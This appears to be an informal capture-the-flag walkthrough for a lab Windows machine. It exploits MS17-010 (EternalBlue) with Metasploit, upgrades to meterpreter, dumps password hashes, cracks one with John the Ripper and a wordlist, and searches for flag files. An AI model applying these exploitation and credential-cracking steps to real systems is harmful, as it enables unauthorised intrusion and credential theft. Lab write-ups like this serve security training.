First lets scan the machine
	sudo nmap -p- -Pn -A -O -vv -sS 10.10.243.201
We find 4 ports open but only 3 under port number 1000
Now what is this machine vulnerable to
	ms17-010
Lets gain access
	open metasploit
	search for ms17-010
	we see the eternalblue exploit
	show options
	set RHOSTS
	set LHOSTS (to your tunnel IP address)
	run
You should already be escalated, when I did this I was already NT/System
But lets keep going through
	background on shell and use the following
		post/multi/manage/shell_to_meterpreter
		show options
		set session 1
	This may not work because you may already be escalated as far as you can be
	Migrate a system process
		we did this before with Windows 7 to utilize the key logger
		migrate xxxx (a PID number)
			THIS ONLY WORKS ABOUT 25 PERCENT OF THE TIME AND IS UNSTABLE
Now lets crack a password
	hashdump
		We can see that there is a user Jon
		copy his name and also the end of the hash
THERE ARE A 1000 DIFFERENT WAYS TO CRACK A HASH, I AM NOT GOING TO SHOW YOU AGAIN, TIME FOR YOU GUYS TO LEARN ON YOUR OWN
	Here is a new one if you really need one john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt windowshash.txt
	We cracked the password and we now have a way back in if we want
	we can also RDP into if we wanted to
Lets go back to the meterpreter session
	type dir and realize there are lot of directories, there needs to be a better way to find the flags
	There are a couple of ways to find the flags
		search -f *flag*
That is it, get your flags and you are done
